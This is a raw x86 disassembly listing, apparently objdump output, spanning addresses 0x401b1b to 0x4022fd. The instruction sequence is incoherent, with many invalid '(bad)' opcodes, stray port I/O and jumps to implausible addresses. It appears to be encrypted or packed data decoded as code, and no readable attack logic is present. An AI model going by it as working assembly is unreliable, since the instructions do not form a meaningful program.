  401b1b:	pop    edi
  401b1c:	ins    BYTE PTR es:[edi],dx
  401b1d:	es pop esp
  401b1f:	int    0xd
  401b21:	xchg   ebp,eax
  401b22:	lahf   
  401b23:	adc    eax,0xcc5a23b1
  401b28:	push   ds
  401b29:	inc    ecx
  401b2a:	enter  0x929,0x7f
  401b2e:	and    BYTE PTR [eax+esi*4+0x5fd077fd],dl
  401b35:	pusha  
  401b36:	dec    edi
  401b37:	mov    ebp,ecx
  401b39:	pop    ds
  401b3a:	inc    edx
  401b3b:	mov    al,ds:0x42d5752d
  401b40:	lods   eax,DWORD PTR ds:[esi]
  401b41:	sub    al,0xd8
  401b43:	mov    ah,0x2c
  401b45:	mov    bh,0x17
  401b47:	and    ebp,DWORD PTR [edx-0xa]
  401b4a:	pop    ecx
  401b4b:	or     BYTE PTR [eax+0xff49b60],ah
  401b51:	add    al,0x82
  401b53:	test   BYTE PTR [ebp+edi*2-0x80],0xc6
  401b58:	or     ebp,DWORD PTR [ebx]
  401b5a:	shr    ecx,1
  401b5c:	add    esp,esp
  401b5e:	sbb    DWORD PTR [ecx],eax
  401b60:	mov    ds:0x21298c5d,eax
  401b65:	xlat   BYTE PTR ds:[ebx]
  401b66:	pop    esi
  401b67:	in     eax,dx
  401b68:	and    DWORD PTR [edx],ebp
  401b6a:	sbb    bl,0x79
  401b6d:	pop    eax
  401b6e:	(bad)  
  401b6f:	push   ss
  401b70:	cmp    esi,DWORD PTR [edi]
  401b72:	ror    DWORD PTR [ecx+esi*4],1
  401b75:	add    dh,ah
  401b77:	cmp    ch,dh
  401b79:	inc    eax
  401b7a:	or     al,dh
  401b7c:	and    eax,0x144d373e
  401b81:	hlt    
  401b82:	das    
  401b83:	jge    0x401bdf
  401b85:	jg     0x401c01
  401b87:	push   esp
  401b88:	lock add edi,DWORD PTR [eax-0x671e1e1d]
  401b8f:	aam    0x2d
  401b91:	sahf   
  401b92:	inc    ebp
  401b93:	xor    al,0xe9
  401b95:	addr16 pop esp
  401b97:	loop   0x401bee
  401b99:	jo     0x401b6b
  401b9b:	data16 jl 0x401bd4
  401b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b9f:	pop    es
  401ba0:	xor    eax,0x1404ccfa
  401ba5:	mov    edi,0x23beb084
  401baa:	inc    edx
  401bab:	xchg   ebp,eax
  401bac:	(bad)  
  401bad:	jl     0x401bea
  401baf:	inc    eax
  401bb0:	imul   ecx,DWORD PTR [edx],0xe8813cec
  401bb6:	ror    BYTE PTR [edi],0xe3
  401bb9:	mov    esp,0xefe857d5
  401bbe:	jp     0x401c29
  401bc0:	or     eax,0x904bfca5
  401bc5:	mov    cl,0xe5
  401bc7:	pop    eax
  401bc8:	fcom   QWORD PTR [ebx-0x52]
  401bcb:	jb     0x401b80
  401bcd:	mov    al,bl
  401bcf:	and    DWORD PTR [ebp-0x7198267d],edx
  401bd5:	pop    eax
  401bd6:	(bad)  
  401bd7:	jmp    0x9c66b793
  401bdc:	in     eax,dx
  401bdd:	jnp    0x401be3
  401bdf:	jp     0x401b65
  401be1:	adc    eax,0x88cf4678
  401be6:	mov    eax,0xbd7370f2
  401beb:	sub    al,BYTE PTR [eax+0x29d56872]
  401bf1:	ret    0x17ce
  401bf4:	sti    
  401bf5:	sahf   
  401bf6:	mov    ebp,0x4783b9df
  401bfb:	add    ebx,DWORD PTR [edx-0x49]
  401bfe:	pop    ebp
  401bff:	xor    DWORD PTR [ecx],0xfa0c7aa3
  401c05:	add    eax,0xbe1bbf95
  401c0a:	sbb    dh,ah
  401c0c:	or     al,bh
  401c0e:	fld    TBYTE PTR [edx+0x32c0b82a]
  401c14:	leave  
  401c15:	jns    0x401bdb
  401c17:	and    BYTE PTR [edx],dl
  401c19:	retf   
  401c1a:	push   ss
  401c1b:	jmp    0x23c1:0x5bf98e66
  401c22:	mov    dh,0x17
  401c24:	sbb    ah,ah
  401c26:	lahf   
  401c27:	test   DWORD PTR [ecx-0x4f405c49],0x12057d48
  401c31:	pop    ebp
  401c32:	aas    
  401c33:	add    eax,0x5a80fe71
  401c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c39:	cmp    al,0xeb
  401c3b:	and    bl,bh
  401c3d:	clc    
  401c3e:	test   al,0x19
  401c40:	ret    
  401c41:	mov    WORD PTR [edi],cs
  401c43:	push   cs
  401c44:	fwait
  401c45:	rcl    bl,0xda
  401c48:	jmp    0x401c8c
  401c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c4b:	inc    edi
  401c4c:	clc    
  401c4d:	mov    ds:0x21476ca9,eax
  401c52:	pop    ebx
  401c53:	in     al,dx
  401c54:	sbb    BYTE PTR [eax+0xe],dl
  401c57:	inc    ecx
  401c58:	xor    al,BYTE PTR [edi-0x1a]
  401c5b:	jo     0x401c28
  401c5d:	test   DWORD PTR [esi-0x21462064],ebx
  401c63:	aam    0x91
  401c65:	sar    ebp,0xd1
  401c68:	mov    ebx,0xb07b4479
  401c6d:	ins    DWORD PTR es:[edi],dx
  401c6e:	sbb    BYTE PTR [edi-0x447c28ee],dl
  401c74:	aam    0x66
  401c76:	loopne 0x401c26
  401c78:	push   es
  401c79:	call   0xebbc34b0
  401c7e:	push   ebp
  401c7f:	lods   eax,DWORD PTR ds:[esi]
  401c80:	mov    cl,0xc4
  401c82:	jb     0x401c5b
  401c84:	jae    0x401cc3
  401c86:	push   ecx
  401c87:	dec    esp
  401c88:	loop   0x401caa
  401c8a:	or     al,0x7
  401c8c:	dec    edx
  401c8d:	pop    esi
  401c8e:	imul   eax,DWORD PTR [ebp+0x31],0x44be7885
  401c95:	nop
  401c96:	pop    ebp
  401c97:	sahf   
  401c98:	xor    bl,BYTE PTR [esi+0x71f0cb8]
  401c9e:	jnp    0x401c9e
  401ca0:	jb     0x401c5a
  401ca2:	jle    0x401cba
  401ca4:	shr    BYTE PTR [ecx+0x40],cl
  401ca7:	push   edi
  401ca8:	mov    ds:0x4dd4fce8,al
  401cad:	jno    0x401cb1
  401caf:	xchg   esp,ebx
  401cb1:	mov    bh,BYTE PTR [eax+0x4b]
  401cb4:	dec    esi
  401cb5:	clc    
  401cb6:	xlat   BYTE PTR ds:[ebx]
  401cb7:	out    0x2e,al
  401cb9:	pusha  
  401cba:	stos   BYTE PTR es:[edi],al
  401cbb:	sub    dh,BYTE PTR [edi+eiz*4]
  401cbe:	mov    bh,0xbf
  401cc0:	outs   dx,BYTE PTR ds:[esi]
  401cc1:	loopne 0x401c82
  401cc3:	je     0x401cbe
  401cc5:	inc    ecx
  401cc6:	sub    dl,ch
  401cc8:	out    dx,al
  401cc9:	jg     0x401c4e
  401ccb:	xor    eax,0x7e666859
  401cd0:	in     eax,dx
  401cd1:	imul   eax,DWORD PTR [esi-0x55274066],0xffffff98
  401cd8:	adc    BYTE PTR [ecx],dh
  401cda:	jg     0x401c84
  401cdc:	and    dl,BYTE PTR [edx+ebp*1+0x62]
  401ce0:	dec    eax
  401ce1:	and    DWORD PTR [edx],esi
  401ce3:	ret    0x9469
  401ce6:	fist   DWORD PTR [ecx-0x283960a1]
  401cec:	xchg   al,al
  401cee:	repnz sar BYTE PTR gs:[ebx+edx*8-0x2eca4f40],cl
  401cf7:	test   ebp,esp
  401cf9:	dec    esp
  401cfa:	mov    edx,0xdf8559d9
  401cff:	(bad)  
  401d00:	(bad)  
  401d01:	(bad)  
  401d03:	lds    ebx,FWORD PTR ds:0x8234cdd2
  401d09:	pop    ecx
  401d0a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401d0c:	inc    esi
  401d0d:	mov    ?,ebx
  401d0f:	add    DWORD PTR [esi-0x268bdef7],ebp
  401d15:	and    al,0xd2
  401d17:	jg     0x401ceb
  401d19:	out    dx,eax
  401d1a:	adc    eax,0xffe82d37
  401d1f:	push   edi
  401d20:	fucomip st,st(1)
  401d22:	and    eax,0xf5ceca31
  401d27:	mov    al,ds:0x7cf9d52d
  401d2c:	nop
  401d2d:	ds xchg esi,eax
  401d2f:	cmp    edi,DWORD PTR [edx-0x67]
  401d32:	push   esp
  401d33:	mov    ds:0xfbe4e0eb,eax
  401d39:	cmc    
  401d3a:	pop    ebp
  401d3b:	mul    ebp
  401d3d:	jb     0x401d30
  401d3f:	push   eax
  401d40:	ret    
  401d41:	xchg   esi,eax
  401d42:	fldenv [edx-0x26c4f094]
  401d48:	repnz lock push es
  401d4b:	pop    ebx
  401d4c:	cwde   
  401d4d:	les    eax,FWORD PTR [edi-0xd]
  401d50:	mov    BYTE PTR [eax],bh
  401d52:	cmp    BYTE PTR [eax],bl
  401d54:	hlt    
  401d55:	sub    eax,0xea43186b
  401d5a:	xchg   ecx,eax
  401d5b:	dec    eax
  401d5c:	iret   
  401d5d:	add    BYTE PTR [ebx],dh
  401d5f:	ret    0x573b
  401d62:	pop    es
  401d63:	loopne 0x401dcb
  401d65:	and    edi,DWORD PTR [ebp-0x19]
  401d68:	stos   BYTE PTR es:[edi],al
  401d69:	sbb    al,BYTE PTR [eax-0x65f89e9f]
  401d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d70:	imul   ebp,ecx,0xea46730c
  401d76:	scas   eax,DWORD PTR es:[edi]
  401d77:	pop    edx
  401d78:	mov    esp,0x5527c665
  401d7d:	cmp    BYTE PTR [ebx+0xb670fce],ah
  401d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d84:	mov    esp,0x5fb173d5
  401d89:	repz enter 0x3ef8,0x96
  401d8e:	imul   BYTE PTR [edx-0x51]
  401d91:	std    
  401d92:	pop    ebp
  401d93:	stos   DWORD PTR es:[edi],eax
  401d94:	jb     0x401d8e
  401d96:	jmp    0x401d31
  401d98:	adc    bh,BYTE PTR [eax-0x32]
  401d9b:	aaa    
  401d9c:	fild   QWORD PTR [ecx-0x36aa9eb7]
  401da2:	jge    0x401e14
  401da4:	pop    esi
  401da5:	mov    dl,0x45
  401da7:	push   edi
  401da8:	scas   al,BYTE PTR es:[edi]
  401da9:	ss int 0xd7
  401dac:	inc    esp
  401dad:	cdq    
  401dae:	test   bh,ah
  401db0:	or     eax,0x4c368598
  401db5:	sub    edx,edi
  401db7:	test   eax,0x2570eb4c
  401dbc:	or     BYTE PTR [edi+0x53],dl
  401dbf:	jmp    0x401d87
  401dc1:	cmp    bl,BYTE PTR [esi]
  401dc3:	loope  0x401de4
  401dc5:	mov    ah,0xee
  401dc7:	inc    eax
  401dc8:	or     BYTE PTR [edi-0x4997f286],dh
  401dce:	jnp    0x401dd8
  401dd0:	mov    ds:0xee153fb3,al
  401dd5:	pop    esp
  401dd6:	fbld   TBYTE PTR [edx]
  401dd8:	sbb    eax,0x88a3db44
  401ddd:	(bad)  
  401dde:	js     0x401e47
  401de0:	mov    al,BYTE PTR [esi]
  401de2:	popa   
  401de3:	sub    DWORD PTR [ecx-0x31],esp
  401de6:	cmp    al,0x81
  401de8:	jecxz  0x401e61
  401dea:	stos   DWORD PTR es:[edi],eax
  401deb:	mov    esp,0xaf3f0f60
  401df0:	xor    DWORD PTR [edx+eiz*2+0x1ae4613d],ecx
  401df7:	add    ch,BYTE PTR [ebx+0x11]
  401dfa:	lea    esi,[esp+eiz*8-0x7515015b]
  401e01:	std    
  401e02:	push   ecx
  401e03:	jo     0x401d8d
  401e05:	add    eax,0x7f45fab
  401e0a:	sbb    dh,BYTE PTR [edi+0x840707d]
  401e10:	aaa    
  401e11:	cmp    ebp,edx
  401e13:	test   eax,0xdbc882a
  401e18:	pop    esp
  401e19:	repnz sbb al,dh
  401e1c:	ins    BYTE PTR es:[edi],dx
  401e1d:	enter  0x957c,0xc9
  401e21:	jo     0x401e77
  401e23:	fucomp st(0)
  401e25:	mov    ds:0xcdfeda7c,eax
  401e2a:	mov    bl,0x7e
  401e2c:	popf   
  401e2d:	cdq    
  401e2e:	add    DWORD PTR [ebx+eax*8],esp
  401e31:	ss mov eax,0x5a74a5c0
  401e37:	out    0x6,eax
  401e39:	pop    ecx
  401e3a:	or     al,0x4e
  401e3d:	popa   
  401e3e:	or     al,0xd
  401e40:	ins    BYTE PTR es:[edi],dx
  401e41:	inc    ecx
  401e42:	out    0x88,al
  401e44:	jle    0x401e4f
  401e46:	loope  0x401e02
  401e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e49:	(bad)  
  401e4a:	cmp    al,BYTE PTR [ecx-0x7f66de0c]
  401e50:	pop    ebx
  401e51:	fisttp WORD PTR [ebp+0x9]
  401e54:	fild   WORD PTR [edx]
  401e56:	push   ds
  401e57:	jmp    0x401e74
  401e59:	(bad)  
  401e5a:	mov    dl,BYTE PTR [eax+edi*8-0x42c401b5]
  401e61:	mov    eax,0x714c81e3
  401e66:	mov    esi,0xc56189cd
  401e6b:	lds    ebx,FWORD PTR [eax-0x73]
  401e6e:	jmp    0xc6157537
  401e73:	inc    ecx
  401e74:	sbb    bl,BYTE PTR [ebx-0x43]
  401e77:	and    eax,0x41243485
  401e7c:	push   edx
  401e7d:	mov    ds:0xd79c7f35,al
  401e82:	outs   dx,DWORD PTR ds:[esi]
  401e83:	push   0x62cee577
  401e88:	push   cs
  401e89:	dec    edi
  401e8a:	inc    edi
  401e8b:	xlat   BYTE PTR ds:[ebx]
  401e8c:	jmp    0xc0f55424
  401e91:	adc    al,0x73
  401e93:	pop    ds
  401e94:	fwait
  401e95:	xor    BYTE PTR [esi+0x4a],ah
  401e98:	dec    edx
  401e99:	dec    ebx
  401e9a:	jo     0x401e58
  401e9c:	mov    al,0xbf
  401e9e:	xchg   BYTE PTR [ecx+edi*4],dh
  401ea1:	fstp   QWORD PTR [ecx-0x50]
  401ea4:	les    edi,FWORD PTR ds:0x7d321e75
  401eaa:	pop    esp
  401eab:	out    dx,eax
  401eac:	(bad)  
  401ead:	jno    0x401e2f
  401eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb0:	xlat   BYTE PTR ds:[ebx]
  401eb1:	icebp  
  401eb2:	mov    ecx,0x9b760882
  401eb7:	popf   
  401eb8:	nop
  401eb9:	or     ebx,DWORD PTR [ecx-0x5b2dbc58]
  401ebf:	inc    ecx
  401ec0:	cmp    bh,BYTE PTR [edx+0x12]
  401ec3:	mov    eax,ds:0x7dd814cd
  401ec8:	out    0x1f,al
  401eca:	sbb    edi,DWORD PTR [eax+0x1f8bdda1]
  401ed0:	inc    ebx
  401ed1:	stos   BYTE PTR es:[edi],al
  401ed2:	call   FWORD PTR cs:[edx+eiz*2]
  401ed6:	punpcklbw mm3,DWORD PTR ds:0x9f269160
  401edd:	fnsave [ebx]
  401edf:	cmp    esp,DWORD PTR [esi+0x43]
  401ee2:	sbb    edi,ebp
  401ee4:	gs cli 
  401ee6:	jo     0x401eca
  401ee8:	dec    ebp
  401ee9:	pop    DWORD PTR [edi-0x5ec572db]
  401eef:	nop
  401ef0:	cmp    BYTE PTR [esi+esi*4+0x59],bh
  401ef4:	xchg   DWORD PTR [esi+0x17d7d5dd],edx
  401efa:	test   DWORD PTR [eax+0x2c73982b],0x476c8be0
  401f04:	shr    DWORD PTR [esi-0x2a],0xa4
  401f08:	pop    ds
  401f09:	test   BYTE PTR [ebp+0x49a2ec80],cl
  401f0f:	fst    DWORD PTR [eax]
  401f11:	dec    ecx
  401f12:	out    dx,eax
  401f13:	scas   al,BYTE PTR es:[edi]
  401f14:	fsub   DWORD PTR [ecx-0x1369fa29]
  401f1a:	dec    ecx
  401f1b:	push   cs
  401f1c:	shl    DWORD PTR [ebp+edi*4+0x4d284397],0x4b
  401f24:	xor    DWORD PTR [ebp-0xc44acfe],ebp
  401f2a:	(bad)  
  401f2b:	leave  
  401f2c:	test   BYTE PTR [edi+edi*1+0x6d],al
  401f30:	lods   al,BYTE PTR ds:[esi]
  401f31:	sub    eax,0x8044fde0
  401f36:	jl     0x401f70
  401f38:	jbe    0x401f37
  401f3a:	in     eax,dx
  401f3b:	into   
  401f3c:	mov    ebx,0xda501e19
  401f41:	ret    0xb438
  401f44:	out    0x23,al
  401f46:	ret    
  401f47:	jecxz  0x401fa6
  401f49:	mov    edi,0x337b86f3
  401f4e:	add    dh,BYTE PTR [eax+eiz*8+0x27f6f175]
  401f55:	or     esi,eax
  401f57:	inc    esp
  401f58:	sti    
  401f59:	ins    DWORD PTR es:[edi],dx
  401f5a:	test   eax,0xb2b17331
  401f5f:	push   0x16
  401f61:	sbb    eax,0x6c0e4b27
  401f66:	cmp    al,bh
  401f68:	fiadd  DWORD PTR [eax]
  401f6a:	pop    edi
  401f6b:	inc    eax
  401f6c:	out    dx,eax
  401f6d:	pop    ecx
  401f6e:	(bad)  
  401f6f:	je     0x401f91
  401f71:	push   0x57
  401f73:	repnz adc esi,DWORD PTR [ebx+0x1e]
  401f77:	xchg   edi,eax
  401f78:	out    dx,al
  401f79:	xor    edi,DWORD PTR [edi+0x59665a4d]
  401f7f:	adc    BYTE PTR [edi+0x52cee36d],cl
  401f85:	lock mov al,0x96
  401f88:	bnd jmp 0x4e31059f
  401f8e:	cmp    DWORD PTR [edx+ebx*8],ecx
  401f91:	int    0x77
  401f93:	call   0x895e6aaf
  401f98:	scas   al,BYTE PTR es:[edi]
  401f99:	cmp    eax,0x3e5e454b
  401f9e:	sbb    eax,0x489ceffd
  401fa3:	loop   0x401fbb
  401fa5:	fmul   QWORD PTR [ebx]
  401fa7:	imul   ebp,edx,0x53
  401faa:	ins    DWORD PTR es:[edi],dx
  401fab:	pop    es
  401fac:	cmc    
  401fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fae:	les    edi,FWORD PTR [esi]
  401fb0:	pop    esp
  401fb1:	mov    esp,0xeec05be
  401fb6:	fild   DWORD PTR [ecx+0x44386bd]
  401fbc:	inc    ecx
  401fbd:	daa    
  401fbe:	sbb    cl,BYTE PTR [edx]
  401fc0:	jae    0x401f95
  401fc2:	xchg   ecx,eax
  401fc3:	cwde   
  401fc4:	inc    eax
  401fc5:	ds xor al,0x6
  401fc8:	test   DWORD PTR [esi+0x4d],eax
  401fcb:	mov    bl,0x1a
  401fcd:	rcl    edx,cl
  401fcf:	retf   
  401fd0:	(bad)  
  401fd2:	mov    WORD PTR [esi],gs
  401fd4:	sub    al,0x0
  401fd6:	int3   
  401fd7:	fisub  WORD PTR [ebp-0x42]
  401fda:	(bad)  
  401fdc:	adc    BYTE PTR [ebx-0xf235c0a],0x25
  401fe3:	arpl   dx,ax
  401fe5:	loopne 0x402018
  401fe7:	ret    0x18c
  401fea:	lods   eax,DWORD PTR ds:[esi]
  401feb:	test   DWORD PTR [eiz*1-0x195caf02],edx
  401ff2:	xchg   edi,eax
  401ff3:	hlt    
  401ff4:	(bad)  
  401ff5:	mov    esi,cs
  401ff7:	jp     0x402039
  401ff9:	sbb    eax,0x11646c9
  401ffe:	lock push ebx
  402000:	cmp    al,0xa6
  402002:	mov    bh,0x38
  402004:	xchg   dh,dh
  402006:	fist   WORD PTR cs:[eax-0x42]
  40200a:	ja     0x40202e
  40200c:	aaa    
  40200d:	repz push edx
  40200f:	daa    
  402010:	lea    ecx,[eax-0x2f]
  402013:	bound  ebx,QWORD PTR [edi]
  402015:	fsub   DWORD PTR [esi+ecx*2-0x1f8bf6f0]
  40201c:	call   0xc5258928
  402021:	ins    DWORD PTR es:[edi],dx
  402022:	(bad)  
  402023:	sbb    eax,0x6b5797b4
  402028:	and    al,0x97
  40202a:	cmp    DWORD PTR [ebx+0x53],esp
  40202d:	retf   0x3e22
  402030:	iret   
  402031:	pop    eax
  402032:	sub    ecx,DWORD PTR [ebp+0x25]
  402035:	and    cl,BYTE PTR [eax-0x43]
  402038:	cmp    eax,0x8327680f
  40203d:	sbb    ch,BYTE PTR [edx+0x4ec296c7]
  402043:	pop    ebp
  402044:	mov    al,0xda
  402046:	cmc    
  402047:	mov    ch,0x79
  402049:	lds    ebp,FWORD PTR [edx]
  40204b:	xchg   esp,eax
  40204c:	add    eax,0x95dad45a
  402051:	or     edi,edx
  402053:	ins    BYTE PTR es:[edi],dx
  402054:	xchg   ebx,eax
  402055:	mov    cl,0xe2
  402057:	mov    WORD PTR [ecx],?
  402059:	dec    eax
  40205a:	pop    es
  40205b:	in     eax,dx
  40205c:	jecxz  0x40205d
  40205e:	leave  
  40205f:	ret    
  402060:	sub    ecx,edx
  402062:	mov    dl,0x61
  402064:	mov    esp,0x9e633ed7
  402069:	push   edx
  40206a:	adc    bh,BYTE PTR [ebp+0x69]
  40206d:	dec    eax
  40206e:	ds mov edi,0x6062291b
  402074:	mov    eax,0xdc03c5b5
  402079:	cmp    eax,0x540417a2
  40207e:	lea    ebp,[esi-0x25]
  402081:	adc    dh,dl
  402083:	(bad)  
  402084:	fs std 
  402086:	sbb    eax,0x22932c4c
  40208b:	adc    al,0xb6
  40208d:	xor    ebx,DWORD PTR [esi+edx*4]
  402090:	inc    esp
  402091:	fldcw  WORD PTR [edi]
  402093:	push   es
  402094:	lods   al,BYTE PTR ds:[esi]
  402095:	in     eax,0xa
  402097:	bound  ebx,QWORD PTR [edi+ecx*4]
  40209a:	push   ebp
  40209b:	add    BYTE PTR [eax-0x65b63b24],al
  4020a1:	inc    ebp
  4020a2:	fs loopne 0x402104
  4020a5:	push   edi
  4020a6:	call   0xbf54:0xd5c048a9
  4020ad:	ror    BYTE PTR [ecx],0x68
  4020b0:	test   al,0x75
  4020b2:	push   ss
  4020b3:	cmp    bh,BYTE PTR ds:0x2c930bbc
  4020b9:	sub    DWORD PTR [ecx+0x19],esi
  4020bc:	das    
  4020bd:	push   ss
  4020be:	lds    eax,FWORD PTR [ebx-0x247abf98]
  4020c4:	jg     0x40210d
  4020c6:	ja     0x4020c6
  4020c8:	mov    eax,ds:0xfbc29555
  4020cd:	iret   
  4020ce:	mov    esp,0xb85d6149
  4020d3:	and    ch,bh
  4020d5:	mov    WORD PTR [edi-0x3ddb4db7],?
  4020db:	mov    dl,0x12
  4020dd:	imul   esp,DWORD PTR [eax+esi*4+0x2940e41f],0x3fd7b943
  4020e8:	es into 
  4020ea:	add    eax,0x6347e098
  4020ef:	call   0x801eeb57
  4020f4:	neg    al
  4020f6:	cli    
  4020f7:	inc    ebx
  4020f8:	jmp    DWORD PTR [edx]
  4020fa:	(bad)  
  4020fb:	fld    TBYTE PTR [edx]
  4020fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020fe:	push   0x35
  402100:	push   ds
  402101:	xor    eax,0xb33d447
  402106:	pop    eax
  402107:	xchg   esp,eax
  402108:	call   0x671f8d5b
  40210d:	pushf  
  40210e:	mov    eax,0x40bb14df
  402113:	push   esp
  402114:	loop   0x402109
  402116:	daa    
  402117:	retf   0xe176
  40211a:	fiadd  DWORD PTR [edi]
  40211c:	fcmovu st,st(0)
  40211e:	fidiv  WORD PTR [ebx+esi*8+0x20]
  402122:	push   es
  402123:	pop    ebx
  402124:	loope  0x40212e
  402126:	shl    DWORD PTR [edx-0x50254980],cl
  40212c:	sbb    BYTE PTR [edi-0x67e5880],dh
  402132:	xor    ah,bl
  402134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402135:	add    BYTE PTR [edi-0xfdaf05e],0x11
  40213c:	xchg   ebx,eax
  40213d:	fdivr  QWORD PTR [eax+0x564e36da]
  402143:	lods   eax,DWORD PTR ds:[esi]
  402144:	out    0x38,al
  402146:	sub    bh,0x22
  402149:	push   esp
  40214a:	jne    0x40218a
  40214c:	dec    esi
  40214d:	call   0xf346:0xa43c75eb
  402154:	jp     0x4020f1
  402156:	cmp    dl,ah
  402158:	loop   0x4021c3
  40215a:	adc    BYTE PTR [eax],ch
  40215c:	retf   
  40215d:	ds and eax,0x88e7b83f
  402163:	cdq    
  402164:	dec    BYTE PTR [ebx]
  402166:	ins    BYTE PTR es:[edi],dx
  402167:	mov    bl,0x98
  402169:	bound  ebx,QWORD PTR [edx-0x35ae8f99]
  40216f:	mov    gs,esi
  402171:	add    al,0x9a
  402173:	scas   eax,DWORD PTR es:[edi]
  402174:	push   edx
  402175:	outs   dx,BYTE PTR ds:[esi]
  402176:	lea    eax,[edx]
  402178:	pop    edi
  402179:	cmp    BYTE PTR [esi+0x1f],ch
  40217c:	adc    ecx,DWORD PTR [ebp-0x4c]
  40217f:	sub    ebp,edx
  402181:	std    
  402182:	sub    eax,0xf12856f0
  402187:	or     esp,esp
  402189:	and    BYTE PTR [ebx+0xd6a63ad],ah
  40218f:	mov    al,0x28
  402191:	popa   
  402192:	ret    
  402193:	mov    BYTE PTR [eax+edi*4-0x77],dh
  402197:	js     0x402212
  402199:	rep ins BYTE PTR es:[edi],dx
  40219b:	test   DWORD PTR [edx-0x5b9aa3fe],eax
  4021a1:	pushf  
  4021a2:	in     eax,0xa
  4021a4:	sahf   
  4021a5:	xor    ebx,DWORD PTR [eax+ebx*4]
  4021a8:	in     al,0x19
  4021aa:	gs jge 0x4021ff
  4021ad:	mul    bl
  4021af:	ret    
  4021b0:	mov    esi,0x5649e695
  4021b5:	out    0xe5,al
  4021b7:	and    al,al
  4021b9:	mov    cl,0x24
  4021bb:	mov    eax,ds:0x2c1474d5
  4021c0:	push   ebx
  4021c1:	push   0xffffff94
  4021c3:	arpl   WORD PTR [esi+0x54],di
  4021c6:	cmp    BYTE PTR [edx+0x41],bh
  4021c9:	cmp    BYTE PTR [ecx+0x69],bl
  4021cc:	mov    cl,al
  4021ce:	cmp    BYTE PTR [eax+esi*8-0x6c],0x6c
  4021d3:	sub    al,0xac
  4021d5:	jmp    FWORD PTR [esi]
  4021d7:	es pushf 
  4021d9:	and    BYTE PTR [eax+edi*8],ch
  4021dc:	xchg   edx,eax
  4021dd:	mov    ds:0x97df02b4,eax
  4021e2:	and    al,0xe5
  4021e4:	mov    ah,0x34
  4021e6:	add    eax,0xedca1774
  4021eb:	or     al,0x70
  4021ed:	and    ch,BYTE PTR [ecx+0x7d9e59a4]
  4021f3:	cmp    BYTE PTR [ebp+0x27],bh
  4021f6:	jg     0x40224c
  4021f8:	rcr    eax,0x7f
  4021fb:	fild   WORD PTR [edx-0x2e6d9fae]
  402201:	sub    BYTE PTR [eax+0x3345e13c],bl
  402207:	xchg   edi,eax
  402208:	push   esi
  402209:	adc    eax,0x32a9822c
  40220f:	(bad)  
  402210:	mov    edi,ecx
  402212:	pop    ds
  402213:	inc    ebp
  402214:	sbb    al,bl
  402216:	mov    ch,0x2d
  402218:	jo     0x4021b8
  40221a:	(bad)  
  40221b:	adc    eax,0x68b45779
  402220:	leave  
  402221:	mov    al,0x5f
  402223:	dec    esp
  402224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402225:	jbe    0x4021de
  402227:	imul   ecx,DWORD PTR [ebp-0x520ecd23],0xf8455a31
  402231:	xor    eax,0x1a7c1d8a
  402236:	mov    bl,BYTE PTR ds:0x5723ee7b
  40223c:	mul    esi
  40223e:	sub    ecx,DWORD PTR [eax-0x43dd7585]
  402244:	pop    ss
  402245:	push   cs
  402246:	rcl    DWORD PTR [edi-0x6b10bd46],0xf2
  40224d:	retf   0x974b
  402250:	ja     0x402200
  402252:	pusha  
  402253:	arpl   WORD PTR [edi],ax
  402255:	dec    ecx
  402256:	lock push esi
  402258:	outs   dx,BYTE PTR ds:[esi]
  402259:	in     eax,0x22
  40225b:	inc    eax
  40225c:	jmp    0x4021e6
  40225e:	cmp    DWORD PTR ds:0x39349f35,0x71c9c350
  402268:	mov    ds:0x46913a1f,eax
  40226d:	jns    0x402227
  40226f:	adc    edx,edi
  402271:	and    ch,BYTE PTR [edx-0x7adfe410]
  402277:	lds    edx,FWORD PTR [ebx-0x8]
  40227a:	cmp    ch,dh
  40227c:	mov    bl,0x93
  40227e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40227f:	push   0x922f28f8
  402284:	add    BYTE PTR [eax],dl
  402286:	or     DWORD PTR [esp+esi*4],ebx
  402289:	ret    0xf190
  40228c:	cwde   
  40228d:	popa   
  40228e:	outs   dx,DWORD PTR ds:[esi]
  40228f:	or     ebx,DWORD PTR [edi]
  402291:	cmp    dh,BYTE PTR [ebp+0x52]
  402294:	gs cmc 
  402296:	scas   al,BYTE PTR es:[edi]
  402297:	stos   BYTE PTR es:[edi],al
  402298:	jmp    0x402295
  40229a:	in     al,0x3b
  40229c:	loope  0x40223b
  40229e:	mov    eax,ebx
  4022a0:	and    bl,BYTE PTR [esi-0x57]
  4022a3:	mov    DWORD PTR [ebx-0x3bd9cf66],edx
  4022a9:	cmc    
  4022aa:	jecxz  0x4022a1
  4022ac:	clc    
  4022ad:	cmp    DWORD PTR [edi+edx*8-0x33f97783],edx
  4022b4:	jo     0x40223d
  4022b6:	mov    WORD PTR [esi-0xa17644],?
  4022bc:	out    0x15,eax
  4022be:	shl    ebp,cl
  4022c0:	ja     0x4022e6
  4022c2:	mov    ebp,0x73b9c782
  4022c7:	sub    DWORD PTR [eax],esp
  4022c9:	ja     0x40233b
  4022cb:	loopne 0x402274
  4022cd:	xchg   DWORD PTR [ecx+0x69],ecx
  4022d0:	fst    DWORD PTR [esi+0x7a]
  4022d3:	jo     0x4022ef
  4022d5:	mov    ebx,0x3de481d7
  4022da:	pop    ds
  4022db:	or     ebx,eax
  4022dd:	mov    bl,0x35
  4022df:	scas   eax,DWORD PTR es:[edi]
  4022e0:	fadd   st,st(4)
  4022e2:	in     al,0x20
  4022e4:	mov    BYTE PTR [edi-0x32],cl
  4022e7:	aaa    
  4022e8:	lea    ebp,[edi-0x768b6fac]
  4022ee:	push   edx
  4022ef:	sub    bh,dh
  4022f1:	adc    eax,0xa34086d4
  4022f6:	mov    ebx,0x47062800
  4022fb:	int    0x5a
  4022fd:	xchg   DWORD PTR [ebx+0x9],edi
